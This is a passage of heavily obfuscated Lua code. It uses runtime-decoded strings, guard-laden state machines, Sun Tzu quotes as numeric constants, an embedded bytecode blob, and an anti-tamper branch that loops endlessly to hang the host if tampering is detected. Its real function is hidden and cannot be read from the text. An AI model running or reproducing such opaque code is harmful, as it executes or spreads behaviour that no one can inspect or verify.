b[D("\23\9\7\8\71\3")]=A("\48",C)e[169]='8Aed9paJMG'e[452]='uatbxze22o'c=395.82383705920745;e[441]=false;d=74.83911247681111;a=624 end;if(a==828)and((c==168.56140243157995)and(d==793.1292951012157)and(e[441]==false)and(e[169]=='9T8GtG9Sf9')and(e[452]=='wapSBQzupf'))then e[441]=false;d=12.99075523033159;e[169]='fEVeng3I9V'b[D("\23\48\21\12\28\51\3\14\39\43\60\9")]=A("\52\9\32\9\55\40\34\52\36\60\47\6\13\19",C)e[452]='gGZaq6k3X0'a=((function(A) return (#A - 38) end)('"If quick, I survive. If not quick, I am lost. This is death." - Sun Tzu'))c=111.17664892751841 end;while((c==33.85040454177432)and(d==38.68258982432405)and(e[441]==false)and(e[169]=='Zf6bNm2sob')and(e[452]=='k4yDi6pw0H'))and(a==794)do e[169]='Gpscu2cZEX'c=4.405476910111888;e[452]='VD3zn7HU7H'd=180.91963580786717;b[D("\23\62\57\11\61\14\21\9\21\25\1\127\12\33")]=A("\28\39\45\4\58\58\35\41\40\28",C)e[441]=false;a=570;break end;while((c==6.991731555599922)and(d==19.563650927795628)and(e[441]==false)and(e[169]=='3L4LEy8vzS')and(e[452]=='GrzCh1zeOL'))and(a==932)do a=197;c=189.8063627152486;b[D("\23\18\36\42\4\59\15\95\62\89\47")]=A("\52\7\58\11\8",C)e[452]='cukeInlNOH'e[441]=false;d=82.36235859652813;e[169]='uxeczImUn4'break end;while(a==303)and((c==870.9753572265521)and(d==21.919898644305427)and(e[441]==false)and(e[169]=='LO58S2YbTb')and(e[452]=='cUscnEAYRj'))do d=48.69962943948238;b[D("\23\41\40\2\7\7\62\36\0\27\51\123\11")]=A("\23\21\1\34\3\0\24\3\21\22",C)e[169]='RIALAFrvv4'e[441]=false;a=616;c=82.04088425117942;e[452]='5ZsgoUckFu'break end;while((c==26.383206211741747)and(d==449.021317486454)and(e[441]==false)and(e[169]=='swhiSquTtO')and(e[452]=='GVAmOJdVkI'))and(a==912)do b[D("\23\46\26\6\24\6\65\53\4\60\35")]=A("\37\0\24\114\38\15\78\35\6\93",C)e[169]='RCumw5GPDn'e[452]='RDNZsj75Ha'c=690.5196473058655;a=897;d=503.5001356141884;e[441]=false;break end;if((c==121.28698831291027)and(d==21.455782815758198)and(e[441]==false)and(e[169]=='qlXA1RtZOF')and(e[452]=='f2ljZXPiXM'))and(a==651)then a=442;d=75.64467542979713;c=110.7581452440547;e[169]='3anJ5pQ80c'b[D("\23\4\28\2\18\62\7\42\34\1\52\49\14\29")]=A("\117\116",C)e[452]='SWo0n9Aisn'e[441]=false end;if(a==22)and((c==23.17363707357344)and(d==328.1516977056299)and(e[441]==false)and(e[169]=='CTkn4TKawv')and(e[452]=='Mff7ULNfi4'))then d=38.68258982432405;e[441]=false;e[452]='k4yDi6pw0H'c=33.85040454177432;e[169]='Zf6bNm2sob'a=794;b[D("\23\7\23\24\45\12\16\11\37\92\11\6\30")]=A("\38",C)end;if((c==25.315090848928246)and(d==57.7973087862952)and(e[441]==false)and(e[169]=='MJ7U9Bf7v2')and(e[452]=='zuAV5yANwA'))and(a==902)then d=4.92404801216662;e[441]=false;a=25;b[D("\23\43\30\31\64\26\59\49\31\56\12\34\15")]=A("\61\27",C)e[452]='TLWdocDpl6'c=5.318995313896302;e[169]='dmlbd0sFlq'end;if((c==88.64362956483592)and(d==487.4243891781486)and(e[441]==false)and(e[169]=='h0coMm7oil')and(e[452]=='ynFdFMgkbg'))and(a==194)then e[452]='KOSs7hsRGg'e[441]=false;d=99.28898019966061;a=614;e[169]='nvep1aY7lW'b[D("\23\44\58\55\68\0\24\16\35\92\23\61\41\33\43\76")]=A("\18\13\55\35\19\88\53\36\5\90",C)c=619.6385748770657 end;if((c==737.2972075129012)and(d==107.67617642066868)and(e[441]==false)and(e[169]=='jGL0XEdxDH')and(e[452]=='MJiynAWtXZ'))and(a==562)then e[452]='zuAV5yANwA'a=902;e[441]=false;c=25.315090848928246;b[D("\23\41\21\51\32\1\66\22\69")]=A("\48\18\0\113\45\48\67\30\42\34",C)e[169]='MJ7U9Bf7v2'd=57.7973087862952 end;while((c==90.56758361833431)and(d==360.9239072875101)and(e[441]==false)and(e[169]=='iqF6ZBLwIY')and(e[452]=='jSLCV35DLM'))and(a==584)do e[169]='dyuwiYNyTA'e[441]=false;b[D("\23\18\0\18\65\34\30\83")]=A("\18\4\14\29\30\2\70\11\61\36",C)e[452]='OqYPMgJBWJ'a=61;d=155.64896270133846;c=273.3538361286074;break end;while((c==32.828928886875765)and(d==351.4423415336414)and(e[441]==false)and(e[169]=='GIUN1YWXd5')and(e[452]=='bk2Hf4UpNl'))and(a==212)do e[452]='RJ4v2RMwJO'e[169]='l2mX3nDp6b'a=677;e[441]=false;b[D("\23\12\0\22\57\16\15\52\69\54\16\38\45\9")]=A("\48\18\38\116\45\37\71\46\68\86",C)c=35.572577503678;d=602.6044499136273;break end;if(a==947)and((c==212.88771405844017)and(d==467.4008059189521)and(e[441]==false)and(e[169]=='bVoJu5nb2N')and(e[452]=='vnepdaEdTH'))then d=160.6221626582243;c=251.81258929925738;e[441]=false;e[169]='YQKyUJ0SZI'a=170;b[D("\23\57\26\112\50\33")]=A("\48",C)e[452]='3nX0f9CLet'end;if(a==347)and((c==198.7831207623078)and(d==75.30868954692528)and(e[441]==false)and(e[169]=='SIc8WqBQgj')and(e[452]=='Kty4yjVUBA'))then c=183.42976578508765;e[441]=false;e[452]='LFOPFODy0Y'b[D("\23\18\6\34\77\2\68\37\5\25\62")]=A("\59\62\29\46\26\14",C)d=111.06027903808112;a=795;e[169]='nnWf8Qeiib'end;if(a==570)and((c==4.405476910111888)and(d==180.91963580786717)and(e[441]==false)and(e[169]=='Gpscu2cZEX')and(e[452]=='VD3zn7HU7H'))then e[169]='GIUN1YWXd5'a=212;d=351.4423415336414;c=32.828928886875765;e[452]='bk2Hf4UpNl'b[D("\23\38\35\30\35\24\41\10\58\55\9\14\36")]=A("\59\47\3\34\23\29",C)e[441]=false end;if(a==241)and((c==172.26797397552627)and(d==274.3114844210588)and(e[441]==false)and(e[169]=='RBF6b5pBKQ')and(e[452]=='aNpUDcygZ7'))then d=122.85711602598006;c=5.739659487617388;e[441]=false;a=663;e[169]='kbkaFak2IC'b[D("\23\0\5\3\22\57\18\17\72\45\8\24\24\8")]=A("\23\21\12\38\24\5",C)e[452]='Izpj4nkh3y'end;if(a==99)and((c==150.74742244624707)and(d==316.9499802026752)and(e[441]==false)and(e[169]=='ayg1wqRfbg')and(e[452]=='92VFVeVxIW'))then e[452]='yow2WotjK7'd=475.14284945140014;e[169]='bT2ho1t3qO'b[D("\23\3\8\112\6\32\31\46\69\27\9\36\115")]=A("\38\63\2\37\17\27",C)a=881;e[441]=false;c=109.05278717938053 end;while(a==484)and((c==546.1260683949209)and(d==754.183930757298)and(e[441]==false)and(e[169]=='2P3WDFUvfg')and(e[452]=='T8NSGvBGpK'))do c=60.52571280801506;d=391.1095970359198;a=937;break end;while(a==340)and((c==236.222072674609)and(d==482.66085158508463)and(e[441]==false)and(e[169]=='5gxriOHDRy')and(e[452]=='owh2DSGt9W'))do a=326;e[169]='Euby28a6nY'c=404.45976086436787;e[452]='h9PQYAyZHt'e[441]=false;b[D("\23\1\58\46\51\8\20\61\35\47\60\48\59")]=A("\48\21\54\24\14\0\64\83\67\20",C)d=551.1984852766207;break end;while(a==0)and((c==204.48954562771078)and(d==197.75824030303875)and(e[441]==false)and(e[169]=='EIBlJs5Nln')and(e[452]=='tW2xRUtdqQ'))do b[D("\23\4\59\13\61\32\67\42\17\63\13")]=A("\41\40\12\35\17\15\17",C)c=48.96270601440641;e[169]='LKZujkew83'd=113.82826969321907;a=324;e[452]='WHdX8j1Nmp'e[441]=false;break end;while((c==420.501459619635)and(d==17.241476013439506)and(e[441]==false)and(e[169]=='qruUUmGB4K')and(e[452]=='K1qM5TUU2D'))and(a==531)do e[441]=false;d=649.5104814266402;e[452]='xrZvF7NG0Q'a=783;b[D("\23\15\36\33\27\62\66\87\6\90\45\33\58")]=A("\23\21\31\53\27\29\25\56\47",C)c=263.74563677351347;e[169]='29by3NxYLO'break end;if(a==431)and((c==427.879744814516)and(d==103.68169855853267)and(e[441]==false)and(e[169]=='KgT37t1Xh7')and(e[452]=='lzw9EueybI'))then d=1.8209175682640453;b[D("\23\12\35\118\17\29")]=A("\42\57\27\29\28\16\12\11\26\92",C)a=948;e[452]='OHoB5FIfDo'c=120.30756325058458;e[441]=false;e[169]='mkj3kt8HwJ'end;if(a==453)and((c==66.22397178776556)and(d==69.73964132638964)and(e[441]==false)and(e[169]=='kjL3dsMqnz')and(e[452]=='8LnqZVSY80'))then c=72.90715326527312;e[452]='0b1BQjuaCF'b[D("\23\12\13\46\70\42\35\49\56\39\0\3\124\44\35")]=A("\18\33\53\49\71\43\57\80\8\6",C)e[441]=false;d=819.0132190317297;e[169]='38RiivWm7C'a=296 end;while((c==395.82383705920745)and(d==74.83911247681111)and(e[441]==false)and(e[169]=='8Aed9paJMG')and(e[452]=='uatbxze22o'))and(a==624)do e[441]=false;e[452]='lzw9EueybI'e[169]='KgT37t1Xh7'b[D("\23\26\14\33\39\95\24\55\1\22\20\33\51\5\52\71")]=A("\7\50\7\38\36\14\36\50\55\58",C)a=431;c=427.879744814516;d=103.68169855853267;break end;if((c==60.38122218582124)and(d==50.0156316369797)and(e[441]==false)and(e[169]=='7HEXQ04Xm5')and(e[452]=='SXbntwgw1j'))and(a==189)then e[452]='IvreJ5RcsH'e[441]=false;a=802;d=336.22857185436743;c=586.2193206433845;e[169]='ETnKAbZNq0'b[D("\23\48\25\48\27\29\5\44\2\38\14\3\37")]=A("\113\56\41\16\55\17\63\47\26\44",C)end;if(a==150)and((c==65.99439114899135)and(d==463.8782903294591)and(e[441]==false)and(e[169]=='rBRVO6aKjz')and(e[452]=='njKycSaSBW'))then d=18.343563612218418;c=330.1653483826809;a=135;e[169]='WuGJ6K1WED'e[441]=false;e[452]='VSbL2Nd2gM'b[D("\23\45\37\8\58\10\65\45\50\26\8")]=A("\47\3\28\62\14\95\20\34\31\62",C)end;while((c==109.05278717938053)and(d==475.14284945140014)and(e[441]==false)and(e[169]=='bT2ho1t3qO')and(e[452]=='yow2WotjK7'))and(a==881)do a=159;e[452]='NXZnopQVv6'e[169]='4XD6uAlSze'b[D("\23\5\53\50\53\89\14")]=A("\23\21\6\41\16\12\14",C)c=99.76762841721009;d=293.58040718622567;e[441]=false;break end;while((c==330.1653483826809)and(d==18.343563612218418)and(e[441]==false)and(e[169]=='WuGJ6K1WED')and(e[452]=='VSbL2Nd2gM'))and(a==135)do c=241.09470132733043;d=121.17618916327532;e[441]=false;e[452]='s4QPXVT1SZ'a=273;b[D("\23\24\57\8\25\60\50\33\20")]=A("\52\31\33\10\8",C)e[169]='LMeo76PtQe'break end;while(a==625)and((c==263.7038154403076)and(d==46.77190947898791)and(e[441]==false)and(e[169]=='CFRuJJCGPT')and(e[452]=='Ih7eQ5gpKV'))do c=420.501459619635;b[D("\23\59\39\8\63\7\18\62\18\23\30\127")]=A("\52\6\59\59",C)d=17.241476013439506;e[169]='qruUUmGB4K'e[441]=false;e[452]='K1qM5TUU2D'a=531;break end;while((c==789.9736482407033)and(d==94.23202495136044)and(e[441]==false)and(e[169]=='mI2pjeVxpd')and(e[452]=='t97v9QiCMy'))and(a==55)do d=410.41005165620913;b[D("\23\63\0\20\59\19\53\30\47\24\2")]=A("\48\18\48\31\46\89\31\83\31\23",C)e[169]='PsEq7nUIG1'c=112.68248171310796;e[452]='yYexi95IAo'a=618;e[441]=false;break end;while((c==482.3570252784566)and(d==795.9896890136158)and(e[441]==false)and(e[169]=='5g5hVgeJSQ')and(e[452]=='9FEpnHmrxZ'))and(a==863)do e[452]='8v9KiK6I5a'b[D("\23\34\11\51\21\91\62\5\39\11\14\123")]=A("\58\14\35\9\61\46\6\31\57\28",C)c=546.599644416202;d=176.6146035908062;e[441]=false;e[169]='VsaU2yvqaL'a=284;break end;if((c==3.977879268081319)and(d==527.7302053697167)and(e[441]==false)and(e[169]=='fMdP4XuxEt')and(e[452]=='ju9D8pgppW'))and(a==456)then e[441]=false;d=45.95998602008117;e[452]='itpFbordlX'c=170.18539570618412;b[D("\23\28\34\0\64\33")]=A("\122\30\37\36\67\27\14\14\0\6",C)a=255;e[169]='IfG3VVvu7c'end;while(a==814)and((c==11.940539496046698)and(d==690.3419385502464)and(e[441]==false)and(e[169]=='CaSPWNGObk')and(e[452]=='V0q2apK1dn'))do e[441]=false;c=6.3274643267013015;a=31;b[D("\23\25\7\6\66\2\51\21")]=A("\20\122",C)d=311.40235064819467;e[169]='f0Kcg6yyfA'e[452]='oG9BAwTTHd'break end;while(a==284)and((c==546.599644416202)and(d==176.6146035908062)and(e[441]==false)and(e[169]=='VsaU2yvqaL')and(e[452]=='8v9KiK6I5a'))do c=686.8558337819408;a=398;e[441]=false;e[169]='cJEpaiDr7c'e[452]='nWJV6n8I1Q'd=26.67520328716491;b[D("\23\16\31\14\68\8\0\20\55\40\36\23\60\29")]=A("\52\9\32\9\55\40\34\52\36\60\47\6\13\19",C)break end;if(a==589)and((c==712.3734913013914)and(d==447.89256524676136)and(e[441]==false)and(e[169]=='94P2YoZb2u')and(e[452]=='MHRQVngcDQ'))then c=371.0680876923186;b[D("\23\59\86\49\60\88\2\1\68\9\47\34\32\53\11")]=A("\48\51\6\126\13\48\31\61\64\22",C)a=823;e[452]='9bDn2ERkvf'e[441]=false;e[169]='G0FxBuCGH4'd=122.31397802331871 end;while((c==300.9354820443647)and(d==1.7065356415582398)and(e[441]==false)and(e[169]=='rzTR5YOgnJ')and(e[452]=='TkmQY7a7xq'))and(a==390)do e[169]='SIc8WqBQgj'a=347;c=198.7831207623078;d=75.30868954692528;e[452]='Kty4yjVUBA'b[D("\23\58\59\126\1\89\69\38")]=A("\9\38\29\34\21\13\15\71\2\15\8\104\98\94\110\85",C)e[441]=false;break end;if(a==784)and((c==210.0896066235834)and(d==559.4110026841272)and(e[441]==false)and(e[169]=='e1eCoAO2nu')and(e[452]=='QkDBjbJNYt'))then e[452]='cUscnEAYRj'b[D("\23\39\13\12\60\35\39\6\72\31\43\16\14\1\17\21")]=A("\52\6\42\9\8",C)e[169]='LO58S2YbTb'd=21.919898644305427;e[441]=false;a=303;c=870.9753572265521 end;while(a==614)and((c==619.6385748770657)and(d==99.28898019966061)and(e[441]==false)and(e[169]=='nvep1aY7lW')and(e[452]=='KOSs7hsRGg'))do e[169]='FgIVHUjxul'b[D("\23\25\43\43\70\42")]=A("\52\11\43\3\8",C)e[452]='GSFXjOHalh'e[441]=false;d=130.30745228111493;a=752;c=556.6719862750879;break end;if(a==875)and((c==225.002004411251)and(d==141.9132616849504)and(e[441]==false)and(e[169]=='PGE087CpNm')and(e[452]=='Fk2gDfRBiA'))then b[D("\23\32\4\61\23\32\38\63\30\95")]=A("\52\25\27\53\29\7\17\20\5\12\26",C)e[169]='CN2yQhQIea'd=28.862909195005788;e[452]='s7HIuvXf2u'a=554;c=175.4771316917748;e[441]=false end;if(a==884)and((c==267.01185019512525)and(d==178.6151744525185)and(e[441]==false)and(e[169]=='nBEOIVn7eu')and(e[452]=='qBeVx1fCeE'))then e[452]='4PZjEHpYTB'e[169]='EOsHv2jlLD'a=546;e[441]=false;b[D("\23\38\33\34\37\63\71\85\61\95\2\49\46\0\3")]=A("\14\19\59\15\59\51\55\9\18\57",C)d=732.3637925318143;c=481.7252505620371 end;if(a==813)and((c==127.25126900798116)and(d==82.69617182367604)and(e[441]==false)and(e[169]=='hNm4uP9aOa')and(e[452]=='5xb5pHufr7'))then c=292.4480169183831;e[169]='YfApft4z6M'e[452]='wFlvLvWH8s'b[D("\23\3\13\40\26\60\15\95\35")]=A("\3\35\89\18\70\92\29\45\51\23",C)e[441]=false;a=33;d=103.47576542322999 end;while((c==224.81924114241053)and(d==449.1732209339906)and(e[441]==false)and(e[169]=='GWcT0xKg0N')and(e[452]=='C6DQa98JzI'))and(a==843)do d=61.6138108977456;a=200;b[D("\23\33\29\29\33\62\38\32\65")]=A("\4\37\3\117\22\6\55\9\17\35",C)e[441]=false;e[452]='D2hxcV0eQO'e[169]='5uUGi5ijgW'c=378.1057334587622;break end;while((c==176.89594285992086)and(d==9.405782995567524)and(e[441]==false)and(e[169]=='Qa4j74aiGw')and(e[452]=='7XFbCqTIKf'))and(a==74)do c=175.14075456511068;b[D("\23\8\37\20\36\58")]=A("\52\25\58\5\8",C)a=685;e[169]='0DEleF0XKu'e[441]=false;e[452]='0ziKTVbjI7'd=6.842641860260457;break end;while(a==125)and((c==132.98117198303382)and(d==61.39795387882763)and(e[441]==false)and(e[169]=='T4zSyfrEJP')and(e[452]=='h1YXJ8Z7dC'))do e[441]=false;e[452]='eEfVf821tf'e[169]='IldmjIFa4Q'c=302.86907818706555;b[D("\23\0\10\15\71\46\47\16\58\25\83\121\16\23\45\64")]=A("\52\11\43\3\8",C)d=144.6568118224165;a=587;break end;while(a==934)and((c==248.05156007256232)and(d==122.08395900483097)and(e[441]==false)and(e[169]=='FPm2wEMNC0')and(e[452]=='SFs47ymghW'))do d=21.455782815758198;e[452]='f2ljZXPiXM'a=651;b[D("\23\61\87\114\59\62\32\40\21\33\30\49\4\26\115\77")]=A("\48\48\94\62\70\38\14\81\73\94",C)c=121.28698831291027;e[169]='qlXA1RtZOF'e[441]=false;break end;if(a==620)and((c==131.36348659842724)and(d==294.6488034287198)and(e[441]==false)and(e[169]=='05E7S50FSw')and(e[452]=='YFRLkzWQiI'))then e[441]=false;b[D("\23\44\86\43\63\93\78\41\2\8\57\29\125\44")]=A("\23\50\3\113\76\93\58\94\70\88\15",C)e[452]='A3Geiv7xYz'a=101;d=702.5206244050557;c=417.0950443886884;e[169]='l4Ere3QEya'end;while((c==582.1274663771266)and(d==175.30286578682558)and(e[441]==false)and(e[169]=='DluTGfkJQN')and(e[452]=='uAI4tjwaes'))and(a==4)do e[441]=false;d=294.6488034287198;a=620;e[169]='05E7S50FSw'e[452]='YFRLkzWQiI'c=131.36348659842724;b[D("\23\9\30\9\4\36\66\82\10\39\44")]=A("\30\30\53\42\48\58\4\37\49\5",C)break end;while((c==690.5196473058655)and(d==503.5001356141884)and(e[441]==false)and(e[169]=='RCumw5GPDn')and(e[452]=='RDNZsj75Ha'))and(a==897)do d=202.6024676441381;e[441]=false;c=404.8825855318942;e[452]='orzN8ZPfIE'a=455;b[D("\23\7\31\35\6\14\49\95\53\61\44\42\29\22\31\71")]=A("\122\0\6\13\49\29\28\81\56\3",C)e[169]='e7v8kupYDC'break end;if((c==70.29971112252217)and(d==168.30864678559016)and(e[441]==false)and(e[169]=='QrokTurOBE')and(e[452]=='4015vs6ze3'))and(a==355)then c=137.7677189461901;d=109.00836393966723;a=534;e[452]='TvA0PXT8B9'b[D("\23\50\37\112\62\51\5\36\55\59\55\30\26")]=A("\49\35\10\43\16",C)e[169]='WF3TKNXu6g'e[441]=false end;if(a==663)and((c==5.739659487617388)and(d==122.85711602598006)and(e[441]==false)and(e[169]=='kbkaFak2IC')and(e[452]=='Izpj4nkh3y'))then e[452]='ewQSZyvM0t'b[D("\23\48\1\49\70\4\20\11\22\27\20\42")]=A("\14\4\57\113\18\90\16\81\22\24",C)c=455.58686379890275;e[441]=false;d=230.80649802080703;e[169]='0zn9nablX0'a=684 end;while(a==823)and((c==371.0680876923186)and(d==122.31397802331871)and(e[441]==false)and(e[169]=='G0FxBuCGH4')and(e[452]=='9bDn2ERkvf'))do b[D("\23\41\26\31\23\27\16\63\5\24")]=A("\59",C)a=776;e[169]='HaqrTdaUs2'e[452]='8vhiaj96Qn'e[441]=false;c=35.8156046961284;d=427.79796975946806;break end;if((c==391.4999555694689)and(d==152.33356513523597)and(e[441]==false)and(e[169]=='YbrrLEkS8n')and(e[452]=='DRaGSER9ky'))and(a==492)then e[452]='ETbXJepDLE'b[D("\23\6\6\63\38\30\31\86\49\38\49")]=A("\30\59\37\19\53\2\44\38\36\24",C)e[169]='sluUywB1mF'c=199.37172696505402;a=741;e[441]=false;d=51.409031091789004 end;while(a==937)and((c==60.52571280801506)and(d==391.1095970359198))do a=0;e[441]=false;e[169]='EIBlJs5Nln'c=204.48954562771078;d=197.75824030303875;e[452]='tW2xRUtdqQ'break end;while((c==226.6161631052762)and(d==33.81762164963651)and(e[441]==false)and(e[169]=='6s6vBMwV1n')and(e[452]=='kc4dCKfrhu'))and(a==988)do b[D("\23\43\27\29\35\57\70\16\30\12\44\29\36\48\45\3")]=A("\39\37\14",C)e[169]='OvM3JPicUW'c=272.05492265490017;e[441]=false;a=381;d=29.606991899071794;e[452]='iQ49t6yjOh'break end;if((c==326.41869424256606)and(d==164.489646792587)and(e[441]==false)and(e[169]=='GzCbgGgubh')and(e[452]=='24rxcR8ksu'))and(a==266)then e[169]='gm6eBfxsgY'b[D("\23\56\14\10\62\88")]=A("\52\26\32\16\8",C)a=536;c=567.2838286859364;e[452]='1d7koDpPIk'd=96.72036972225406;e[441]=false end;while(a==255)and((c==170.18539570618412)and(d==45.95998602008117)and(e[441]==false)and(e[169]=='IfG3VVvu7c')and(e[452]=='itpFbordlX'))do b[D("\23\30\86\8\50\88\27\44\28\63\60\61")]=A("\49\4\23\50\71\25\49\84\36\88",C)e[441]=false;c=26.383206211741747;d=449.021317486454;e[452]='GVAmOJdVkI'e[169]='swhiSquTtO'a=912;break end;if(a==678)and((c==148.09694725947088)and(d==208.1346792551914)and(e[441]==false)and(e[169]=='wuKtjXWK6e')and(e[452]=='IfC3R0rloG'))then e[452]='NyGfVbsmKJ'e[441]=false;a=631;c=1.7473757435744102;e[169]='Y014ieY5ys'd=65.93474407996553;b[D("\23\60\27\4\55\2\34\41\4\30\94\4\121\40")]=A("\107",C)end;if((c==168.70691956429778)and(d==572.3879451800492)and(e[441]==false)and(e[169]=='dA7VzF3Mtl')and(e[452]=='n9VhkhtxrR'))and(a==476)then e[169]='SKdXLzQmpK'd=52.57754738590913;e[441]=false;c=56.1702834279291;a=20;b[D("\23\6\86\51\49\93\39\17\10\34\28\56\1")]=A("\123\127\90\16\27\43\1\52\42\86",C)e[452]='1CLnHkxaaq'end;while(a==536)and((c==567.2838286859364)and(d==96.72036972225406)and(e[441]==false)and(e[169]=='gm6eBfxsgY')and(e[452]=='1d7koDpPIk'))do b[D("\23\56\35\2\44\14\18\62\47\89\3\18\11\33")]=A("\23\50\53\63\12\17\68\86\57\54\47\126\19\21\112\43\89\65",C)e[441]=false;d=364.17483772183436;a=811;e[169]='5Wz5EpnKxu'c=209.15521085304866;e[452]='lJ1kaE6LS5'break end;while((c==273.3538361286074)and(d==155.64896270133846)and(e[441]==false)and(e[169]=='dyuwiYNyTA')and(e[452]=='OqYPMgJBWJ'))and(a==61)do b[D("\23\26\53\1\44\16\50\17\20\43")]=A("\48\19\87\62\56\88\70\56\8\54",C)e[169]='bQiz8wPrXV'c=35.54978769125634;a=379;e[452]='D08pv9f1RC'd=317.21301059750976;e[441]=false;break end;while((c==168.44002670978787)and(d==125.24024709655275)and(e[441]==false)and(e[169]=='MBqijrXIvf')and(e[452]=='rpCorJEScK'))and(a==672)do c=737.2972075129012;e[169]='jGL0XEdxDH'b[D("\23\46\86\53\30\40\78\43\57\42")]=A("\112\124\46\30\39\25\34\80\6\38",C)d=107.67617642066868;e[452]='MJiynAWtXZ'a=562;e[441]=false;break end;while(a==592)and((c==15.455560486829276)and(d==182.2592978030402)and(e[441]==false)and(e[169]=='jUuTYW2nQE')and(e[452]=='OmBofU2Rpo'))do e[441]=false;e[452]='vRFChhTYCA'b[D("\23\50\60\51\49\63\79\84\17\23\48\46")]=A("\52\7\32\3\8",C)d=99.76410311271961;c=67.51880924935898;e[169]='87NwztBuDB'a=959;break end;while((c==415.533199589295)and(d==239.16700112510514)and(e[441]==false)and(e[169]=='Wzu8XSQdqS')and(e[452]=='QsGi7NUGHn'))and(a==501)do c=712.3734913013914;b[D("\23\39\13\50\25\63\27\43\42\5\32")]=A("\23\21\31\53\27\29\25\56\47",C)a=589;d=447.89256524676136;e[169]='94P2YoZb2u'e[452]='MHRQVngcDQ'e[441]=false;break end end end end end end;b[(b._rLEXgdY_7eZAN)]=h;local h=c()[w({59,62,((function(A) return (#A - 142) end)('"In battle, there are not more than two methods of attack-the direct and the indirect; yet these two in combination give rise to an endless series of maneuvers." - Sun Tzu')),46,26,14})]local h=c()[w({43,37,29,40,1,29,31,9,((function(A) return (#A - 150) end)('"In battle, there are not more than two methods of attack-the direct and the indirect; yet these two in combination give rise to an endless series of maneuvers." - Sun Tzu'))})]local k=c()[w({59,47,((function(A) return (#A - 41) end)('"One may know how to conquer without being able to do it." - Sun Tzu')),42,17,(#('"Build your opponent a golden bridge to retreat across." - Sun Tzu') - 37),23,19,17,12,10,45})]local l=c()[w({56,43,6,53,7})]local y=c()[w({60,37,1,50,25,11,19,21})]local A=c()[w({60,37,28,51,6,0,24,0})]local C=c()[w({59,47,(#('"To secure ourselves against defeat lies in our own hands, but the opportunity of defeating the enemy is provided by the enemy himself." - Sun Tzu') - 119),53,21,30})]local C=c()[w({60,51,31,34})]local H=c()[w({47,47,27,42,(#('"There are not more than five musical notes, yet the combinations of these five give rise to more melodies than can ever be heard. There are not more than five primary colours, yet in combination they produce more hues than can ever been seen. There are not more than five cardinal tastes, yet combinations of them yield more flavours than can ever be tasted." - Sun Tzu') - 353),29,23,19,(#('"Attack is the secret of defense; defense is the planning of an attack." - Sun Tzu') - 65),12,10,45})]local I=c()[w({58,43,(#('"Who wishes to fight must first count the cost." - Sun Tzu') - 34),32,17,(#('"You have to believe in yourself." - Sun Tzu') - 15)})]local I=c()[w({61,36,((function(A) return (#A - 51) end)('"Attack is the secret of defense; defense is the planning of an attack." - Sun Tzu')),38,23,2})]local J=c()[w({41,57,((function(A) return (#A - 181) end)('Anger may in time change to gladness; vexation may be succeeded by content. But a kingdom that has once been destroyed can never come again into being; nor can the dead ever be brought back to life." - Sun Tzu')),34,6,29})]local J=c()[w({45,56,29,40,6})]local K=c()[w({59,47,3,34,23,29})]local L=c()[w({56,41,14,43,24})]local M=c()[w({56,56,6,41,0})]local w=c()[w({60,43,13,43,17})]local w=b["\95\120\90\120\120\120\50\49\73\88\73\54\89\122\55\95\48\55"]local h=h[(b._xJ7JZsCGUQVP)]local function N(...)local a,a=...local a=f(A(a),(b._ihzbD))()return y(a)end;local O=N(L(function()local a=(b._Na9Wu3)^1 end))local M=M;local function P(...)return K((b._vtCCkTNtp8L3G),...),{...}end;local K="\0\128\18x\0\0\0\203\255\1\0\1\0\0\0\0\1\0\0\0\0\248\36x\0\0\0\203\255\1\0\1\0\0\0\0\2\0\0\0\0\251\4n\0\0\0\0\0\3\0\0\0\0\187\1b\0\0\0\12\0\0\0\5\0\0\0\0\4\0\0\0\0\207\2a\0\0\0\0\0\0\0\13\1\0\11\64\64\0\0\5\0\0\0\0\219\3b\0\2\0\4\0\0\0\129\128\0\0\0\6\0\0\0\0\224\3a\0\0\0\3\0\0\0\2\0\0\28\128\128\1\0\7\0\0\0\0\192\3a\0\0\0\0\0\0\0\8\1\0\6\192\64\0\0\8\0\0\0\1\4b\0\1\0\2\0\0\0\69\0\1\0\0\0\1\1b\0\2\0\0\0\0\0\164\0\0\0\0\9\0\0\0\0\238\1a\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\10\0\0\0\0\154\31a\0\1\0\2\0\0\0\1\0\0\92\64\0\1\0\11\0\0\0\0\30\2a\0\0\0\1\0\0\0\0\0\0\30\0\128\0\0\12\0\0\0\2"if(b[q]==nil)then return(function()while M~=c do a=n(a,1,#a-1)..(b._MjPvKu0CXRx8Z1)end end)()end;local function a()if t(r(H(j),nil,(b._wxy2Mt2wtEFBKQ0)),(b._s_SLy8wq))then return h()end end;local function h(j,o,p,q,H)local M;local Q=(b._cuXcrfXuv)local Q=(b._teGVnVxE_bMiyfH)local Q=(b._i_IBjT85Mzl52)local Q;local R;local S=false;local T;local U;local V;local W;local X;local Y=(b._aqX4sMVoVjjE)local Y=(b._sfxY8q10)for a in a do break end;local Y;local Z;local ab;if((j~=0 and o~=(b._sXpKSxbkYbYpk1q))and j~=(b._y9eNXjnzm0gO8))then while(j~=0)do o=(b._DVDsWYBC6klkHlL)end elseif(j==0 and o==(b._sXpKSxbkYbYpk1q))then S=true end;local bb={}for a=((function(A) return (#A - 107) end)('"It is easy to love your friend, but sometimes the hardest lesson to learn is to love your enemy." - Sun Tzu')),s(64,(#('"It is easy to love your friend, but sometimes the hardest lesson to learn is to love your enemy." - Sun Tzu') - 104),(b._XKmpRy8N7I))do bb[a]=d(s(a,((function(A) return (#A - 81) end)('"Attack is the secret of defense; defense is the planning of an attack." - Sun Tzu')),(b._tKcPXKXVThvIO)))end;local cb;local db=(function(a,...)return a and z end)((b._JDIJPg))local d=u((b._amGD4JVyp),d(),(b._zzKhZuiWEZA))do local a=826;local c=261.06864230205696;local d=155.45378553437294;local e={}while(true)do if((c==261.06864230205696)and(d==155.45378553437294))and(a==826)then a=0;d=109.65645166614068;e[165]=(b._oaC4_Y9c)c=605.0016997503124;e[959]=(b._UtgVjtqQDWGKN)e[290]=false end;if((c==605.0016997503124)and(d==109.65645166614068)and(e[290]==false)and(e[959]==(b._UtgVjtqQDWGKN))and(e[165]==(b._oaC4_Y9c)))and(a==0)then d=770.2092247154675;a=803;e[290]=false;e[959]=(b._m09H19WY3Lf0)e[165]=(b._duAlo7RtRE)W=S and(p)or({})c=164.41810759821004 end;while((c==12.742230222814111)and(d==67.79094438183903)and(e[290]==false)and(e[959]==(b._VMG4H))and(e[165]==(b._aojhgNS1gg)))and(a==957)do d=155.45378553437294;c=261.06864230205696;a=826;break 